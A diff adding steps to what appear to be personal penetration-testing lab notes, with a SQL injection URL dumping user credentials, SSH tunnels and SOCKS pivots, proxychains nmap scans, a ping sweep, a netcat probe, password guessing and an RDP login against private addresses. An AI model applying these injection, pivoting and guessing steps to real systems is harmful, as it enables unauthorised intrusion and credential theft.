@@ -236,8 +236,25 @@ START LINOPS
 12 http://localhost:3002/pick.php?product=7 UNION SELECT user_id,name,username FROM users
 13. using cyberchef use ROT13 to decode
 FROM PUBLIC FACING 
-14.  ssh Aaron@192.168.28.172 
-
+14.  ssh Aaron@192.168.28.172
+FROM LINOPS
+15. ssh -p 3001 user2@localhost -L 3002:192.168.28.172:22 -NT
+16. ssh -p 3002 Aaron@localhost
+      situational awareness
+      ip n
+       192.168.28.190
+17. ssh -p 3002 Aaron@localhost -D 9050 -NT
+18. proxychains nmap -Pn 192.168.28.190 -T4
+FROM ROUND SENSOR
+19. for i in {1..254}; do(ping -c 1 192.168.28.$i | grep "bytes from" &) ; done
+      192.168.28.190
+      192.168.28.179
+FROM LINOPS
+20. proxychains nmap -Pn 192.168.28.179 -T4
+21. proxychains nc 192.168.28.179 9999
+22. ssh -p 3012 Aaron@localhost -L 3004:192.168.28.179:22 -NT
+      try usernames and passwords till they work
+23. xfreerdp /u:Lroth /v:localhost:3014 +glyph-cache +clipboard +dynamic-resolution
       
 
 
